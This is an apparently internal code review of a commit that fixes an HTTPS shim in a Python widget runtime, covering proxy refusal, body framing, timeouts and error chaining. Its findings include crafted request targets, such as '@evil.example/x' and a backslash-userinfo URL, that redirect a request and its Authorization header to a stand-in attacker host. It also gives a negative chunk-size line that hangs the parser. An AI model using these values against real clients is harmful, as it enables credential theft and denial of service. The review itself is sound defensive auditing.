---
layout: "default"
title: "T-4303: the https shim fixes (Pernille, cff2e415eb), independent review"
section: "documents"
description: "Verdict: PASS with notes. H1, M1, M2, L1 and L3 are fixed, and the new socket frames every request the old one did (13 send patterns, byte-identical, below). One new Medium must be fixed before any build sets system_tls\u2026"
---
<div class="crumbs" role="navigation" aria-label="Back"><a class="back" href="{{ '/documents/pywidget/design/' | relative_url }}">← Design &amp; Specs</a><a href="{{ '/documents/pywidget/t4303-idris.html' | relative_url }}" rel="bookmark">Permanent link</a></div>
<div class="page-head"><div class="kicker"><span class="kind grey">Review</span><span>Day 25 · Sun Nov 15</span><span><code>pywidget/docs/reviews/t4303-idris.md</code></span></div><h1>T-4303: the https shim fixes (Pernille, cff2e415eb), independent review</h1><div class="byline"><img class="avatar" src="{{ '/assets/portraits/idris.svg' | relative_url }}" alt="Idris" title="Idris"><span>By <a href="{{ '/cast/idris.html' | relative_url }}">Idris</a>, Senior iOS engineer</span></div></div>

<style>.doc-body{overflow-wrap:break-word}.doc-src{overflow-wrap:anywhere}.tbl[data-n~="1"] tr>:nth-child(1),.tbl[data-n~="2"] tr>:nth-child(2),.tbl[data-n~="3"] tr>:nth-child(3),.tbl[data-n~="4"] tr>:nth-child(4),.tbl[data-n~="5"] tr>:nth-child(5),.tbl[data-n~="6"] tr>:nth-child(6),.tbl[data-n~="7"] tr>:nth-child(7),.tbl[data-n~="8"] tr>:nth-child(8),.tbl[data-n~="9"] tr>:nth-child(9),.tbl[data-n~="10"] tr>:nth-child(10),.tbl[data-n~="11"] tr>:nth-child(11),.tbl[data-n~="12"] tr>:nth-child(12){min-width:0;overflow-wrap:normal}.tbl[data-o="1"] tr>:nth-child(1),.tbl[data-o="2"] tr>:nth-child(2),.tbl[data-o="3"] tr>:nth-child(3),.tbl[data-o="4"] tr>:nth-child(4),.tbl[data-o="5"] tr>:nth-child(5),.tbl[data-o="6"] tr>:nth-child(6),.tbl[data-o="7"] tr>:nth-child(7),.tbl[data-o="8"] tr>:nth-child(8),.tbl[data-o="9"] tr>:nth-child(9),.tbl[data-o="10"] tr>:nth-child(10),.tbl[data-o="11"] tr>:nth-child(11),.tbl[data-o="12"] tr>:nth-child(12){position:sticky;right:0;overflow-wrap:normal;background:var(--page);box-shadow:-1px 0 var(--line),-9px 0 8px -8px var(--sh)}</style>
<div class="doc-body" markdown="1">

{% raw %}
Reviewer: Idris, 2026-11-15. Task T-4312, Commandment 13 (independent review before TestFlight).
Read: `git show cff2e415eb` (4 files): `_pywidget_runtime/systls.py`, `pywidget/tests/systls` (driver and
test file), C2 s6. Checked against my findings in [`pywidget/docs/reviews/t3400-idris.md`](t3400-idris.html) (T-4294), by reading
the code and by host probes, not from the commit message. Line numbers are systls.py's at db8484cbb7 unless named.
No Xcode build, no device run: the shim is still off in every build, and nothing here changes that.

**Verdict: PASS with notes.** H1, M1, M2, L1 and L3 are fixed, and the new socket frames every request the old
one did (13 send patterns, byte-identical, below). One new Medium must be fixed before any build sets `system_tls`
or ships without `_ssl`: a raw `http.client` target that does not start with `/` can move the request, with its
headers, to another host (M1). One Low in the chunk parser, which the rewrite carried over (L1), and one Low in
the new C2 sentence (L2). Two tests that prove M1 and L1 land with this review, marked expected failures.

## 1. The T-4294 findings

- **H1 (proxy): fixed.** `HTTPSConnection.connect` (:424-427) and urllib3's (:453-456) raise
  `ProxyNotSupported` when `_tunnel_host` is set or urllib3's `proxy` is not None, before any socket exists, so
  nothing is built, let alone sent. `_url` (:315-331) refuses an absolute-form target for another host or a
  non-https scheme, which covers urllib's `http://` URL through an `https://` proxy and urllib3 forwarding even
  if `proxy` were missing. Paths checked: urllib `ProxyHandler`, `set_tunnel` by hand, absolute form, requests
  `proxies=`, urllib3 `ProxyManager(use_forwarding_for_https=True)` (Pernille's `proxy` scenario), and, added
  here, `HTTPS_PROXY` in the environment through urllib's default opener and requests' `trust_env`, with
  `NO_PROXY` for the host going direct (`env_proxy`, green on 3.9.6 and 3.13, red on the pre-fix module).
  The bridge saw no call in any refused case.
- **M1 (quadratic bodies): fixed.** `_take` (:279-313) keeps a `bytearray`, searches for the head's end from
  where it stopped (`_scan - 3`), counts a Content-Length body, and de-chunks one chunk at a time with
  `del buf[:k]` (front deletion is cheap on a bytearray). 10 MiB minus one from a `BytesIO` through http.client:
  0.04 s on 3.13, 0.05 s on 3.9.6 (was 10.56 s). The test's 1.0 s bound has a wide margin.
- **M2 (timeout): fixed.** urllib3 connections build the socket with `defer=True` (:456); the request goes at
  the first read of the reply (`_ReplyReader`, :367-380), which is inside `getresponse()` after urllib3 has set
  the read timeout, and `_whole_timeout` (:333-338) adds the connect figure kept at `connect()`.
  `timeout=(3.05, 27)` reaches Swift as 30.05; a Swift timeout is `ReadTimeout` on 3.10 and up.
  http.client keeps its one figure (`defer` False). See note N1 for `Timeout(total=)`.
- **L1 (SSLError): fixed** for urllib3 and requests (:458-467): only the two TLS refusals are rewrapped,
  `Offline` stays a `ConnectionError` (the `u3_errors` scenario checks both). L2 noted in the docstring, as agreed.
- **L3 (folded headers): fixed.** `_parse_head` joins a continuation line onto the header before it with one
  space, which is what RFC 9112 s5.2 asks a recipient to do with obs-fold.
- **L4**: kept, and the docstring now says so (:65-66, :545-546). Fine.

## 2. Framing parity, old socket against new (host probe)

I fed the same `sendall` sequences to the pre-fix `BridgeSocket` (ea5eb9a749's module) and to the new one, in
both modes, through a recording transport, and compared method, URL, headers and body handed to Swift. All 13
are identical on 3.9.6 and 3.13; the deferred mode differs only in the timeout figure, as intended.


<div class="tbl" role="region" tabindex="0" aria-label="Table 1: 2. Framing parity, old socket against new (host probe), scrolls sideways" style="--tw:407px" markdown="1">

| Case | Result |
|---|---|
| GET, head only; POST head and body in one send | identical |
| POST head, then body one byte per send; whole request one byte per send (head split across `\r\n\r\n`) | identical |
| chunked with an extension (`5;foo=bar`) and a trailer; chunked one byte per send; chunk data containing `\r\n` | identical |
| `Expect: 100-continue` with the body sent after the head (header passed through, body sent) | identical |
| pipelined: two GETs in one send (the second becomes the first's body, in both: N3) | identical |
| Content-Length 2 with extra bytes after; memoryview pieces; 600,000-byte body by file | identical |
| request incomplete when the reply is read (sent as it is) | identical |

</div>


A <span title="The starting recipe a lane uses to look for ideas. G2, for example, starts from public datasets.">generator</span> passed to `sendall` still raises `TypeError` before any state changes (`bytearray +=`), so
http.client's iterable fallback works as it did. After a whole request, further sends are dropped; http.client
cannot write a second request before reading the reply, and every reply carries `Connection: close`.

## 3. Findings

- **M1 (Medium). A target that is not `/...` or an absolute URL moves the request to another host.**
  `_url` (:319-320) prefixes any non-absolute target with `https://host[:port]` and sends the string as it is.
  `conn = HTTPSConnection("api.example.com"); conn.request("GET", "@evil.example/x", headers={"Authorization": ...})`
  sends `https://(email withheld)/x` to Swift: host `evil.example`, with the Authorization header.
  `.evil.example/x` gives host `api.example.com.evil.example`; `evil.example:443` (authority form) gives a host
  of `api.example.comevil.example`. With OpenSSL the socket is already connected to api.example.com, so a bad
  target is only a 400 from that host; here the target picks the host. requests, urllib and urllib3 always
  write `/...`, so only a script calling http.client with a path it built can reach this, but a path built from
  a server's or a widget parameter's text is exactly where it would happen. The absolute-form check (:321-331)
  has a second gap of the same kind: `https://evil.example\@api.example.com/x` passes it (urlsplit's host is
  api.example.com) and is forwarded verbatim; a WHATWG-style parser reads `\` as `/` and the host as
  evil.example. What Foundation's `URL` does with it is not observed. Fix: accept origin form (`/` or `?`
  first) and absolute https form only, and in both cases build the URL from the connection's own host and port
  plus the split path and query, never the script's string; refuse anything else (authority form, `*`) with a
  named error before sending. Test: `target_host` scenario (expected failure until fixed).
- **L1 (Low). The chunk-size line is parsed loosely; a negative size spins `sendall` forever.**
  `int(..., 16)` (:306) accepts `-F`, `+5`, `0x5` and `5_0`. With `-F` the loop at :302-313 computes a
  negative length, deletes nothing, and finds the same line again: the run hangs in Python (probe: no return in
  5 s; the pre-fix `_dechunk` hangs the same way, so it is carried over, not new). Also, a declared chunk over
  10 MiB is buffered whole before `_cap` (:312) refuses it (probe: 64 MiB declared, 11 MiB held, no refusal),
  where the docstring (:223) says "refused at once". Only a script writing its own chunk framing reaches either.
  Fix: size must match `[0-9A-Fa-f]+` (after the `;` split and strip), else `ValueError`; call
  `_cap(len(self._body) + size)` as soon as the size is known. Test: `chunk_size_line` (expected failure).
- **L2 (Low). C2 s6's new SSLError sentence names the wrong link.** It says requests' `SSLError` has
  `CertificateRejected` "as its cause". Probe: `e.__cause__` is None and `e.__context__` is `MaxRetryError`;
  the error is at `e.args[0].reason.__cause__` (urllib3's `SSLError`'s cause). A script following the sentence
  finds nothing. Reword to say requests' `SSLError` wraps urllib3's, whose `__cause__` is `CertificateRejected`
  (or chain it in the shim, if that is simpler). Fold in N1's wording at the same time.

## 4. Notes (no change asked)

- **N1.** `urllib3.Timeout(total=5)` reaches Swift as 10.0 s (probe: 9.9999), because urllib3 gives both connect
  and read the total. The docstring and C2 say total "is not seen"; it is seen twice. Acceptable (the run's
  budget still cuts); the wording should say "about twice `total`" (with L2).
- **N2.** `ProxyNotSupported` lives in `_pywidget_runtime.systls`, a private module; scripts meet it as
  `ConnectionError`, `URLError.reason` or requests' `ProxyError`, which is enough. If the user docs name it,
  Maren should decide whether it belongs in `pywidget.errors`.
- **N3.** A request with no Content-Length and no chunking is whole at its head, so anything sent after it in
  the same write becomes its body (old and new alike). http.client never writes that; recorded, not a finding.
- **N4.** Pernille's five scenarios each fail on the pre-fix module for the reason they name (checked:
  `PW_RUNTIME_DIR` pointed at ea5eb9a749's Runtime): proxy (sent to proxy.example:8080), big_bodies
  (2.97 s), timeouts (3.05), u3_errors (ConnectionError), folded_header (bogus header). Tests fail for the right
  reason.

## 5. Swift half (T-3401, mine)

Unchanged by this commit and still owed: https-only `url` with a non-empty host, no accepting trust handler, no
ATS exceptions, a resource (whole-request) timeout, `body_file` read only under the app's temporary folder.
After M1's fix Swift should also refuse a `url` with userinfo, as a second wall.

## Tests run (my copy at db8484cbb7, host, fake bridge)

`python3 pywidget/tests/run_host.py --both systls`: 21 tests on 3.9.6 and on 3.13.18, all pass, 2 expected
failures (the review's M1 and L1 tests); 18/18 before my three were added. Added: `env_proxy` (green),
`target_host` and `chunk_size_line` (`@unittest.expectedFailure`; the fix removes the decorator, since an
unexpected success fails the suite). Probes (scratch, not kept in the repo): framing parity, edge targets and
chunk sizes, `Timeout(total=)`, requests' SSLError chain, 10 MiB timing.
{% endraw %}

</div>
